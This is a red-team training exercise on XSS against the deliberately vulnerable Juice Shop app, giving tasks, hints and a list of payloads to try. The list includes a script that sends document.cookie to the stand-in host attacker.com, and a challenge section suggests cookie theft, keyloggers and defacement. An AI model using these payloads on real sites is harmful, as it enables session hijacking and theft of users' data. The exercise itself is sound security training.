# Red Team Exercise 03: Cross-Site Scripting (XSS)

**Difficulty:** ⭐⭐ Intermediate  
**Time:** 20 minutes  
**OWASP Category:** A03:2021 - Injection

## Objective

Discover and exploit various types of XSS vulnerabilities in the Juice Shop application.

## Prerequisites

- Completed previous exercises
- Understanding of JavaScript and HTML
- Browser with Developer Tools

---

## Tasks

### Task 3.1: Reflected XSS (5 minutes)

Find and exploit a reflected XSS vulnerability:
1. Look for user input that is reflected back in the page
2. Inject a JavaScript payload that shows an alert
3. Document the vulnerable parameter

**Hints:**
- Check the search functionality
- Look at URL parameters
- Try the track order feature

---

### Task 3.2: DOM-Based XSS (10 minutes)

Find and exploit a DOM-based XSS vulnerability:
1. Analyze client-side JavaScript for unsafe DOM manipulation
2. Find where user input is directly inserted into the DOM
3. Craft a payload that executes JavaScript

**Hints:**
- Look for `innerHTML`, `document.write`, or similar
- Check URL hash fragments
- Examine the search results page

---

### Task 3.3: Stored XSS (5 minutes)

Find and exploit a stored (persistent) XSS vulnerability:
1. Find an input field that stores data
2. Inject a persistent XSS payload
3. Verify the payload executes when the page is viewed

**Target Areas:**
- User feedback/comments
- Product reviews
- User profile fields

**Hints:**
- Register a new account
- Look for markdown or HTML rendering
- Try customer feedback form

---

## XSS Payloads to Try

```javascript
// Basic Alert
<script>alert('XSS')</script>

// Without script tags
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

// Event handlers
<div onmouseover=alert('XSS')>Hover me</div>
<input onfocus=alert('XSS') autofocus>

// Encoded payloads
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert&#40;'XSS'&#41;>

// Cookie stealing (for testing only)
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>

// DOM-based
javascript:alert('XSS')
#<script>alert('XSS')</script>
```

---

## Challenge: Advanced XSS

1. Can you steal session cookies using XSS?
2. Can you create a keylogger using stored XSS?
3. Can you deface the page using XSS?
4. Can you bypass XSS filters with encoding?

---

## Success Criteria

- [ ] Found and exploited reflected XSS
- [ ] Found and exploited DOM-based XSS
- [ ] Found and exploited stored XSS
- [ ] Documented bypass techniques used

---

## Notes

Document your findings:

```
Reflected XSS:
- Location: 
- Payload: 

DOM-Based XSS:
- Location: 
- Payload: 

Stored XSS:
- Location: 
- Payload: 

Bypass Techniques Used:
1. 
2. 
```

---

**Next Exercise:** [Exercise 04 - Broken Authentication](./exercise-04-broken-auth.md)
